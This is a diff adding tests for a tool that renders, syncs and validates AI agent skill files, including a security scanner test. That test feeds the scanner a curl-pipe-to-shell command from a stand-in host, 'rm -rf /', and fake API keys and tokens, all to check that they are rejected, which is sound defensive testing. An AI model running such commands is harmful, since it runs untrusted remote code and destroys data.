@@ -1,4 +1,11 @@
 import { test } from "node:test";
+import { spawnSync } from "node:child_process";
+import { cpSync, existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
+import { tmpdir } from "node:os";
+import { join } from "node:path";
+import { fileURLToPath } from "node:url";
+import { applySync, planSync, scanText, validateFiles } from "../src/skills/sync.js";
+import { checkGeneratedHash, parseSkillFile, renderSkill, targetsFor } from "../src/skills/render.js";
 import assert from "node:assert/strict";
 import { SkillRegistry, validateSkill, type SkillContext } from "../src/skills/registry.js";
 import { SkillResolver } from "../src/skills/resolver.js";
@@ -313,4 +320,157 @@ test("resolver (real catalog): MCP and planned skills are reported unavailable, 
 
 test("buildProfiles on a custom organization yields no profiles (grants are for the canonical ids only)", () => {
   assert.equal(buildProfiles(system.registry, []).list().length, 0);
+});
+
+// ---- rendering, sync and file validation ----------------------------------------------------------
+
+const repoRoot = fileURLToPath(new URL("../../", import.meta.url));
+const tmp = (): string => mkdtempSync(join(tmpdir(), "agentlab-skills-"));
+/** A scratch root with the hand-written ai-testing-lab skill copied in, so manual-skill checks pass. */
+function scratch(): string {
+  const root = tmp();
+  mkdirSync(join(root, ".claude/skills"), { recursive: true });
+  cpSync(join(repoRoot, ".claude/skills/ai-testing-lab"), join(root, ".claude/skills/ai-testing-lab"), { recursive: true });
+  return root;
+}
+const find = (problems: string[], re: RegExp) => problems.some((p) => re.test(p));
+
+test("render: frontmatter round-trips descriptions with colons and quotes; hash detects hand edits", () => {
+  const tricky = skill({ description: 'Use when: "quoted" text, colons: and #hashes appear.' });
+  const text = renderSkill(tricky, "claude");
+  const parsed = parseSkillFile(text);
+  assert.equal(parsed.name, "demo-skill");
+  assert.equal(parsed.description, tricky.description);
+  assert.equal(checkGeneratedHash(text), "ok");
+  assert.equal(checkGeneratedHash(text.replace("Do the demo.", "Do something else.")), "tampered");
+  assert.equal(checkGeneratedHash("---\nname: x\ndescription: y\n---\nhand written"), "not-generated");
+  assert.equal(renderSkill(tricky, "claude"), text, "rendering is deterministic");
+  assert.notEqual(renderSkill(tricky, "agent"), text, "environment block differs");
+});
+
+test("render: targets follow manual/planned/documented/environment rules", () => {
+  assert.deepEqual(targetsFor(skill()), ["claude", "agent"]);
+  assert.deepEqual(targetsFor(skill({ environmentSupport: "claude" })), ["claude"]);
+  assert.deepEqual(targetsFor(skill({ environmentSupport: "agent" })), ["agent"]);
+  assert.deepEqual(targetsFor(skill({ manual: true })), []);
+  assert.deepEqual(targetsFor(skill({ status: "planned" })), []);
+  assert.deepEqual(targetsFor(skill({ status: "planned", documented: true })), ["claude", "agent"]);
+  const generated = system.registry.list().filter((x) => targetsFor(x).length > 0).map((x) => x.id).sort();
+  assert.deepEqual(generated, ["agentlab-android-qa", "agentlab-core", "agentlab-crash-analysis", "agentlab-exploration", "agentlab-mcp", "agentlab-security", "agentlab-smoke-testing"]);
+});
+
+test("sync: the committed .claude and .agent directories match the catalog exactly", () => {
+  assert.deepEqual(validateFiles(system.registry, repoRoot), []);
+  const plan = planSync(system.registry, repoRoot);
+  assert.equal(plan.entries.length, 14);
+  assert.ok(plan.entries.every((e) => e.status === "ok"));
+  assert.deepEqual(plan.orphans, []);
+});
+
+test("sync: writes missing files, is idempotent, and detects drift and hand edits", () => {
+  const root = scratch();
+  try {
+    let plan = planSync(system.registry, root);
+    assert.ok(plan.entries.every((e) => e.status === "missing"));
+    assert.equal(applySync(plan).written.length, 14);
+    plan = planSync(system.registry, root);
+    assert.ok(plan.entries.every((e) => e.status === "ok"));
+    assert.equal(applySync(plan).written.length, 0);
+    assert.deepEqual(validateFiles(system.registry, root), []);
+
+    const file = join(root, ".claude/skills/agentlab-core/SKILL.md");
+    writeFileSync(file, readFileSync(file, "utf8").replace("## Purpose", "## Purpose (edited)"));
+    assert.ok(find(validateFiles(system.registry, root), /agentlab-core\/SKILL\.md: edited by hand/));
+    applySync(planSync(system.registry, root));
+    assert.deepEqual(validateFiles(system.registry, root), []);
+  } finally {
+    rmSync(root, { recursive: true, force: true });
+  }
+});
+
+test("sync: .claude and .agent metadata that disagree are reported, and orphans need --prune", () => {
+  const root = scratch();
+  try {
+    applySync(planSync(system.registry, root));
+    const agentFile = join(root, ".agent/skills/agentlab-security/SKILL.md");
+    writeFileSync(agentFile, readFileSync(agentFile, "utf8").replace(/^description: .*$/m, 'description: "Something else entirely."'));
+    assert.ok(find(validateFiles(system.registry, root), /agentlab-security: \.claude and \.agent metadata differ/));
+    applySync(planSync(system.registry, root));
+
+    const orphan = join(root, ".claude/skills/agentlab-retired");
+    mkdirSync(orphan, { recursive: true });
+    writeFileSync(join(orphan, "SKILL.md"), readFileSync(join(root, ".claude/skills/agentlab-core/SKILL.md"), "utf8"));
+    const handMade = join(root, ".claude/skills/someone-elses-skill");
+    mkdirSync(handMade, { recursive: true });
+    writeFileSync(join(handMade, "SKILL.md"), "---\nname: someone-elses-skill\ndescription: hand written\n---\nhi\n");
+
+    const plan = planSync(system.registry, root);
+    assert.deepEqual(plan.orphans.map((o) => o.split(/[\\/]/).pop()), ["agentlab-retired"]);
+    assert.ok(find(validateFiles(system.registry, root), /agentlab-retired: generated skill no longer in the catalog/));
+    applySync(plan);
+    assert.ok(existsSync(orphan), "orphans are kept without --prune");
+    applySync(plan, { prune: true });
+    assert.ok(!existsSync(orphan));
+    assert.ok(existsSync(handMade), "hand-written skills are never pruned");
+  } finally {
+    rmSync(root, { recursive: true, force: true });
+  }
+});
+
+test("sync: manual skills must exist and match the catalog", () => {
+  const root = tmp();
+  try {
+    assert.ok(find(validateFiles(system.registry, root), /ai-testing-lab\/SKILL\.md: manual skill file is missing/));
+    mkdirSync(join(root, ".claude/skills/ai-testing-lab"), { recursive: true });
+    writeFileSync(join(root, ".claude/skills/ai-testing-lab/SKILL.md"), "---\nname: wrong-name\ndescription: Not the catalog text.\n---\n");
+    const problems = validateFiles(system.registry, root);
+    assert.ok(find(problems, /frontmatter name "wrong-name" must be ai-testing-lab/));
+    assert.ok(find(problems, /frontmatter description differs from the catalog/));
+  } finally {
+    rmSync(root, { recursive: true, force: true });
+  }
+});
+
+test("security scan: dangerous commands, secrets and executable files in skill directories are rejected", () => {
+  assert.deepEqual(scanText("Use `adb devices` and run npm test."), []);
+  assert.ok(scanText("curl https://x.example/install | sh").length > 0);
+  assert.ok(scanText("rm -rf /").length > 0);
+  assert.ok(scanText("sudo apt install foo").length > 0);
+  assert.ok(scanText("key: sk-ant-api03-abcdefghijklmnopqrstuvwxyz0123456789").length > 0);
+  assert.ok(scanText("-----BEGIN PRIVATE KEY-----").length > 0);
+  assert.ok(scanText("Authorization: Bearer abcdefghijklmnopqrstuvwxyz0123456789").length > 0);
+
+  const root = scratch();
+  try {
+    applySync(planSync(system.registry, root));
+    writeFileSync(join(root, ".agent/skills/agentlab-core/helper.sh"), "echo hi\n");
+    writeFileSync(join(root, ".claude/skills/ai-testing-lab/knowledge/leak.md"), "token ghp_abcdefghijklmnopqrstuvwxyz0123456789\n");
+    const problems = validateFiles(system.registry, root);
+    assert.ok(find(problems, /helper\.sh: only Markdown is allowed/));
+    assert.ok(find(problems, /leak\.md: looks like a GitHub token/));
+  } finally {
+    rmSync(root, { recursive: true, force: true });
+  }
+});
+
+test("cli: validate exits non-zero on problems and zero after sync; list and sync --check work", () => {
+  const cli = join(repoRoot, "dist/src/skills/cli.js");
+  const run = (args: string[]) => spawnSync(process.execPath, [cli, ...args], { encoding: "utf8" });
+  const root = scratch();
+  try {
+    const bad = run(["validate", "--root", root]);
+    assert.equal(bad.status, 1);
+    assert.match(bad.stderr, /missing/);
+    assert.equal(run(["sync", "--check", "--root", root]).status, 1);
+    assert.equal(run(["sync", "--root", root]).status, 0);
+    assert.equal(run(["validate", "--root", root]).status, 0);
+    assert.equal(run(["sync", "--check", "--root", root]).status, 0);
+    const listed = run(["list", "--agents"]);
+    assert.equal(listed.status, 0);
+    assert.match(listed.stdout, /agentlab-exploration/);
+    assert.match(listed.stdout, /MAIN-05-A/);
+    assert.equal(run(["nonsense"]).status, 1);
+  } finally {
+    rmSync(root, { recursive: true, force: true });
+  }
 });
